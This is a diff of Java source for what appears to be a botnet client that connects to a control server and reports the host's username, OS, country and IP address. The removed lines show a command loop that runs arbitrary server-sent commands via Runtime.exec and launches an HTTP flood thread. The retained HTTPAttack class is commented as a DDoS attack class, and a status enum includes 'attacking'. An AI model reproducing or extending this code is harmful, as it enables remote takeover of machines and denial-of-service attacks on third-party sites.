@@ -1,48 +1,92 @@
 package br.com.pricher.server.core;
 
+import br.com.pricher.server.messages.Message;
+import br.com.pricher.server.messages.MessageType;
+import br.com.pricher.server.messages.Status;
+
 import java.io.*;
-import java.net.*;
+import java.net.HttpURLConnection;
+import java.net.InetAddress;
+import java.net.Socket;
+import java.net.URL;
 
 /**
  * Created by Douglas Giovanella on 31/07/2017.
  */
 public class Client {
 
+    private static final String HASCONNECTED = "has connected";
+
     private Socket socket;
     private BufferedWriter bfw;
+    private static ObjectOutputStream oos;
+    public String hostname;
+    public int port;
+    public String username;
+    public String SOName;
+    public String SOCountry;
+    public InetAddress ipAddress;
+    private InputStream is;
+    private ObjectInputStream input;
+    private OutputStream outputStream;
+
+    public Client(String hostname, int port, String username, String SOName, String SOCountry, InetAddress ipAddress) {
+        this.hostname = hostname;
+        this.port = port;
+        this.username = username;
+        this.SOName = SOName;
+        this.SOCountry = SOCountry;
+        this.ipAddress = ipAddress;
+    }
 
     public static void main(String[] args) throws IOException {
-        Client app = new Client();
+        Client app = new Client(
+                "localhost",
+                8094,
+                System.getProperty("user.name"),
+                System.getProperty("os.name"),
+                System.getProperty("user.country"),
+                InetAddress.getLocalHost());
         app.connect();
-        app.execute();
     }
 
     private void connect() throws IOException {
         do {
             try {
-                socket = new Socket("localhost", 8094);
-                OutputStream ou = socket.getOutputStream();
-
-                Writer ouw = new OutputStreamWriter(ou);
-                bfw = new BufferedWriter(ouw);
-
-            } catch (Exception e) {
-                System.err.println(e.getMessage());
+                socket = new Socket(hostname, port);
+                outputStream = socket.getOutputStream();
+                oos = new ObjectOutputStream(outputStream);
+                is = socket.getInputStream();
+                input = new ObjectInputStream(is);
+            } catch (IOException e) {
+                System.err.println("Could not connect to server");
             }
-
         } while (socket == null);
-        System.out.println("Conectado...");
-        //Nome de usuario no pc
-        String osUser = System.getProperty("user.name");
-        //Sistema Operacional
-        String osName = System.getProperty("os.name");
-        //Pais de origem
-        String osCountry = System.getProperty("user.country");
 
-        InetAddress ipAddress = InetAddress.getLocalHost();
+        System.out.println("Connection accepted " + socket.getInetAddress() + ":" + socket.getPort());
 
-        bfw.write(osUser + "&" + osCountry + "&" + osName + "&" + ipAddress + "\r\n");
-        bfw.flush();
+        try {
+            connectMsg();
+            System.out.println("Sockets in and out ready!");
+            while (socket.isConnected()) {
+                Message message = null;
+                message = (Message) input.readObject();
+
+                if (message != null) {
+                    System.out.println("Messsage received:" + message.getMsg() + " MessageType:" + message.getType() + "Name:" + message.getName());
+                    switch (message.getType()) {
+                        case NOTIFICATION:
+                            break;
+                        case DISCONNECTED:
+                            break;
+                        case STATUS:
+                            break;
+                    }
+                }
+            }
+        } catch (IOException | ClassNotFoundException e) {
+            e.printStackTrace();
+        }
     }
 
 
@@ -52,55 +96,40 @@ public class Client {
      * @throws IOException retorna IO Exception caso dê algum erro.
      */
     private void sendMessage(String msg) throws IOException {
-        bfw.write(msg + "\r\n");
-        bfw.flush();
+        Message createMessage = new Message();
+        createMessage.setName(username);
+        createMessage.setType(MessageType.USER);
+        createMessage.setMsg(msg);
+        oos.writeObject(createMessage);
+        oos.flush();
     }
 
-    /**
-     * Método usado para receber mensagem do servidor
-     *
-     * @throws IOException retorna IO Exception caso dê algum erro.
-     */
-    private void execute() throws IOException {
+    public void sendStatusUpdate(Status status) throws IOException {
+        Message createMessage = new Message();
+        createMessage.setName(username);
+        createMessage.setType(MessageType.STATUS);
+        createMessage.setStatus(status);
+        oos.writeObject(createMessage);
+        oos.flush();
+    }
 
-        InputStream in = socket.getInputStream();
-        InputStreamReader inr = new InputStreamReader(in);
-        BufferedReader bfr = new BufferedReader(inr);
-        String msg = "";
-
-        while (!"Exit".equalsIgnoreCase(msg))
-            if (bfr.ready()) {
-                msg = bfr.readLine();
-                String[] msgFormatted = msg.split("&");
-                try {
-                    switch (Integer.parseInt(msgFormatted[0])) {
-                        case 0:
-                            Runtime.getRuntime().exec(msgFormatted[1]);
-                            sendMessage("Computer programed to turn off!!!");
-                            break;
-                        case 1:
-                            java.awt.Desktop.getDesktop().browse(new URI(msgFormatted[1]));
-                            sendMessage("Site " + msgFormatted[1] + " open!");
-                            break;
-                        case 2:
-                            Runtime.getRuntime().exec(msgFormatted[1]);
-                            sendMessage("Command executed!");
-                            break;
-                        case 66:
-                            new HTTPAttack(msgFormatted[1], Integer.parseInt(msgFormatted[2])).start();
-                            break;
-                        default:
-                            sendMessage("Message code invalid!");
-                            break;
-
-                    }
-                } catch (Exception e) {
-                    sendMessage("Error to execute the command! " + e.getMessage());
-                }
-            }
+    /* esse método is usado para enviar a mensagem de conexao */
+    public void connectMsg() throws IOException {
+        Message createMessage = new Message();
+        createMessage.setName(username);
+        createMessage.setType(MessageType.CONNECTED);
+        createMessage.setMsg(HASCONNECTED);
+        createMessage.setCountry(this.SOCountry);
+        createMessage.setOSName(this.SOName);
+        createMessage.setIpAddress(this.ipAddress);
+        oos.writeObject(createMessage);
     }
 }
 
+
+/**
+ * Classe de ataque DDOS
+ */
 class HTTPAttack extends Thread {
     private static final int LOW = 1;
     private static final int MEDIUM = 2;
@@ -156,3 +185,81 @@ class HTTPAttack extends Thread {
         }
     }
 }
+
+///**
+// * Classe para enviar mensagens
+// */
+//class Message implements Serializable {
+//    private String name;
+//    private MessageType type;
+//    private String msg;
+//    private Status status;
+//
+//    private String Country;
+//    private String OSName;
+//    private InetAddress ipAddress;
+//
+//    public String getCountry() {
+//        return Country;
+//    }
+//
+//    public void setCountry(String country) {
+//        Country = country;
+//    }
+//
+//    public String getOSName() {
+//        return OSName;
+//    }
+//
+//    public void setOSName(String OSName) {
+//        this.OSName = OSName;
+//    }
+//
+//    public InetAddress getIpAddress() {
+//        return ipAddress;
+//    }
+//
+//    public void setIpAddress(InetAddress ipAddress) {
+//        this.ipAddress = ipAddress;
+//    }
+//
+//    public String getName() {
+//        return name;
+//    }
+//
+//    public void setName(String name) {
+//        this.name = name;
+//    }
+//
+//    public MessageType getType() {
+//        return type;
+//    }
+//
+//    public void setType(MessageType type) {
+//        this.type = type;
+//    }
+//
+//    public String getMsg() {
+//        return msg;
+//    }
+//
+//    public void setMsg(String msg) {
+//        this.msg = msg;
+//    }
+//
+//    public Status getStatus() {
+//        return status;
+//    }
+//
+//    public void setStatus(Status status) {
+//        this.status = status;
+//    }
+//}
+//
+//enum MessageType {
+//    DISCONNECTED, CONNECTED, STATUS, USER, SERVER, NOTIFICATION
+//}
+//
+//enum Status {
+//    REALIZANDO_TAREFA, PARADO, DESCONECTADO, ATACANDO, ACESSANDO_SITE
+//}
